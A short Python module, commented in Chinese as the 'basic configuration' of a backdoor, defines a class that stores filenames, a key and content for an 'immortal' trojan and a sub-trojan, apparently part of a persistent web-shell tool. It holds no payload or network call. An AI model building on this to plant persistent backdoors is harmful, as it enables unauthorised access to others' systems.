import base64
#后门基本配置
class Description:
    
    def __init__(self,immortalTrojFilename,subTrojFileName,trojKey,immortalTrojContent):
        self.immortalTrojFilename=immortalTrojFilename
        self.subTrojFilename=subTrojFileName
        self.trojKey=trojKey
        self.trojContent=immortalTrojContent
        
    @property
    def subTrojectParam(self):
        return self.trojKey[:5]